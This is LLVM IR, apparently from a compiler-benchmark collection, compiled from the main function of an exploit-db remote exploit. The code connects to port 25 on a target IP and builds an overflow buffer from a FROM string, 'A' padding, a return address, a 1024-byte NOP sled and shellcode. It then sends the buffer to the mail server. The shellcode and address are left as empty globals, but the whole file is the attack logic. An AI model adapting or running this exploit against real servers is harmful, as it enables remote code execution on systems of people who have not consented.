; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19887.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19887.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, i32 }
%struct.sockaddr = type { i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [14 x i8] c"Usage: %s IP\0A\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [12 x i8] c"%s.%u-%s.%u\00", align 1
@FROM = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [9 x i8] c": mail [\00", align 1
@RET = common dso_local global i64 0, align 8
@shellcode = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [256 x i8], align 16
  %14 = alloca [1500 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* %4, align 4
  %16 = icmp ne i32 %15, 2
  br i1 %16, label %17, label %24

17:                                               ; preds = %2
  %18 = load i32, i32* @stderr, align 4
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @fprintf(i32 %18, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 -1) #3
  unreachable

24:                                               ; preds = %2
  %25 = load i32, i32* @PF_INET, align 4
  %26 = load i32, i32* @SOCK_STREAM, align 4
  %27 = call i32 @socket(i32 %25, i32 %26, i32 0)
  store i32 %27, i32* %6, align 4
  %28 = icmp slt i32 %27, 0
  br i1 %28, label %29, label %31

29:                                               ; preds = %24
  %30 = call i32 @exit(i32 -1) #3
  unreachable

31:                                               ; preds = %24
  %32 = bitcast %struct.sockaddr_in* %7 to i8*
  %33 = call i32 @bzero(i8* %32, i32 12)
  %34 = load i32, i32* @AF_INET, align 4
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %34, i32* %35, align 4
  %36 = call i32 @htons(i32 25)
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i32 %36, i32* %37, align 4
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  %42 = call i32 @inet_aton(i8* %40, i32* %41)
  %43 = load i32, i32* %6, align 4
  %44 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %45 = call i64 @connect(i32 %43, %struct.sockaddr* %44, i32 12)
  %46 = icmp slt i64 %45, 0
  br i1 %46, label %47, label %49

47:                                               ; preds = %31
  %48 = call i32 @exit(i32 -1) #3
  unreachable

49:                                               ; preds = %31
  store i32 4, i32* %9, align 4
  %50 = load i32, i32* %6, align 4
  %51 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %52 = call i32 @getsockname(i32 %50, %struct.sockaddr* %51, i32* %9)
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = call i32 @inet_ntoa(i32 %54)
  %56 = call i8* @strdup(i32 %55)
  store i8* %56, i8** %11, align 8
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @inet_ntoa(i32 %58)
  %60 = call i8* @strdup(i32 %59)
  store i8* %60, i8** %12, align 8
  %61 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i64 0, i64 0
  %62 = load i8*, i8** %11, align 8
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %64 = load i32, i32* %63, align 4
  %65 = call i32 @ntohs(i32 %64)
  %66 = load i8*, i8** %12, align 8
  %67 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @ntohs(i32 %68)
  %70 = call i32 @snprintf(i8* %61, i32 256, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i8* %62, i32 %65, i8* %66, i32 %69)
  %71 = load i8*, i8** %11, align 8
  %72 = call i32 @free(i8* %71)
  %73 = load i8*, i8** %12, align 8
  %74 = call i32 @free(i8* %73)
  %75 = getelementptr inbounds [1500 x i8], [1500 x i8]* %14, i64 0, i64 0
  %76 = call i32 @bzero(i8* %75, i32 1500)
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %77

77:                                               ; preds = %91, %49
  %78 = load i32, i32* %10, align 4
  %79 = load i8*, i8** @FROM, align 8
  %80 = call i32 @strlen(i8* %79)
  %81 = icmp slt i32 %78, %80
  br i1 %81, label %82, label %96

82:                                               ; preds = %77
  %83 = load i8*, i8** @FROM, align 8
  %84 = load i32, i32* %10, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %83, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = load i32, i32* %9, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [1500 x i8], [1500 x i8]* %14, i64 0, i64 %89
  store i8 %87, i8* %90, align 1
  br label %91

91:                                               ; preds = %82
  %92 = load i32, i32* %9, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %9, align 4
  %94 = load i32, i32* %10, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %10, align 4
  br label %77

96:                                               ; preds = %77
  store i32 0, i32* %10, align 4
  br label %97

97:                                               ; preds = %112, %96
  %98 = load i32, i32* %10, align 4
  %99 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i64 0, i64 0
  %100 = call i32 @strlen(i8* %99)
  %101 = sub nsw i32 256, %100
  %102 = call i32 @strlen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  %103 = sub nsw i32 %101, %102
  %104 = load i8*, i8** @FROM, align 8
  %105 = call i32 @strlen(i8* %104)
  %106 = sub nsw i32 %103, %105
  %107 = icmp slt i32 %98, %106
  br i1 %107, label %108, label %117

108:                                              ; preds = %97
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds [1500 x i8], [1500 x i8]* %14, i64 0, i64 %110
  store i8 65, i8* %111, align 1
  br label %112

112:                                              ; preds = %108
  %113 = load i32, i32* %9, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %9, align 4
  %115 = load i32, i32* %10, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %10, align 4
  br label %97

117:                                              ; preds = %97
  %118 = load i64, i64* @RET, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds [1500 x i8], [1500 x i8]* %14, i64 0, i64 %120
  %122 = bitcast i8* %121 to i64*
  store i64 %118, i64* %122, align 1
  %123 = load i32, i32* %9, align 4
  %124 = add nsw i32 %123, 4
  store i32 %124, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %125

125:                                              ; preds = %132, %117
  %126 = load i32, i32* %10, align 4
  %127 = icmp slt i32 %126, 1024
  br i1 %127, label %128, label %137

128:                                              ; preds = %125
  %129 = load i32, i32* %9, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds [1500 x i8], [1500 x i8]* %14, i64 0, i64 %130
  store i8 -112, i8* %131, align 1
  br label %132

132:                                              ; preds = %128
  %133 = load i32, i32* %9, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %9, align 4
  %135 = load i32, i32* %10, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %10, align 4
  br label %125

137:                                              ; preds = %125
  store i32 0, i32* %10, align 4
  br label %138

138:                                              ; preds = %152, %137
  %139 = load i32, i32* %10, align 4
  %140 = load i8*, i8** @shellcode, align 8
  %141 = call i32 @strlen(i8* %140)
  %142 = icmp slt i32 %139, %141
  br i1 %142, label %143, label %157

143:                                              ; preds = %138
  %144 = load i8*, i8** @shellcode, align 8
  %145 = load i32, i32* %10, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i8, i8* %144, i64 %146
  %148 = load i8, i8* %147, align 1
  %149 = load i32, i32* %9, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds [1500 x i8], [1500 x i8]* %14, i64 0, i64 %150
  store i8 %148, i8* %151, align 1
  br label %152

152:                                              ; preds = %143
  %153 = load i32, i32* %9, align 4
  %154 = add nsw i32 %153, 1
  store i32 %154, i32* %9, align 4
  %155 = load i32, i32* %10, align 4
  %156 = add nsw i32 %155, 1
  store i32 %156, i32* %10, align 4
  br label %138

157:                                              ; preds = %138
  %158 = load i32, i32* %6, align 4
  %159 = getelementptr inbounds [1500 x i8], [1500 x i8]* %14, i64 0, i64 0
  %160 = getelementptr inbounds [1500 x i8], [1500 x i8]* %14, i64 0, i64 0
  %161 = call i32 @strlen(i8* %160)
  %162 = call i64 @write(i32 %158, i8* %159, i32 %161)
  %163 = icmp slt i64 %162, 0
  br i1 %163, label %164, label %166

164:                                              ; preds = %157
  %165 = call i32 @exit(i32 -1) #3
  unreachable

166:                                              ; preds = %157
  %167 = load i32, i32* %6, align 4
  %168 = call i32 @close(i32 %167)
  %169 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_aton(i8*, i32*) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @getsockname(i32, %struct.sockaddr*, i32*) #1

declare dso_local i8* @strdup(i32) #1

declare dso_local i32 @inet_ntoa(i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, i32, i8*, i32) #1

declare dso_local i32 @ntohs(i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
